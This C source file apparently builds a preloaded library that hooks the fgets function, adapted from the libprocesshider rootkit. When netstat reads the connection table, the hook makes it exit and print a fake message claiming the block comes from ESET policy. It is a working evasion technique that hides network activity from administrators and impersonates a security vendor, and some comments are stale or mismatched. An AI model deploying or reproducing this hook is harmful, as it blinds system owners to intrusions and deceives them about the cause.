// https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c
// https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/

#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

static const char* STRING_TO_SEARCH = "rem_address"; // corresponds to 50000
//static const char* PORT_TO_HIDE = "00000000:C350"; // corresponds to 50000


//#define DECLARE_READ(ssize_t, read) \
static ssize_t (*original_##read)(int, void*, size_t) = NULL; \
\
ssize_t read(int filedes, void *buffer, size_t size) { \
    if(original_##read == NULL) { \
        original_##read = dlsym(RTLD_NEXT, #read); \
        if(original_##read == NULL) { \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror()); \
        } \
    } \
    \
    fprintf(stderr, "Intercepted read file"); \
    return original_##read(filedes, buffer, size); \
}

// DECLARE_READDIR(ss_size_t, read);


#define DECLARE_FGETS(char, fgets) \
static char* (*original_##fgets)(char*, int, FILE*) = NULL; \
\
char* fgets(char *s, int count, FILE *stream) { \
    if(original_##fgets == NULL) { \
        original_##fgets = dlsym(RTLD_NEXT, #fgets); \
        if(original_##fgets == NULL) { \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror()); \
        } \
    } \
    \
    char *originalLine = original_##fgets(s, count, stream); \
    if (originalLine != NULL && strstr(originalLine, STRING_TO_SEARCH) != NULL) { \
        /*fprintf(stderr, "Intercepted read stream");*/ \
        printf("***netstat blocked by ESET policy***\n"); \
        exit(0); \
        /*return NULL;*/ \
    } \
    return originalLine; \
}

DECLARE_FGETS(char, fgets);
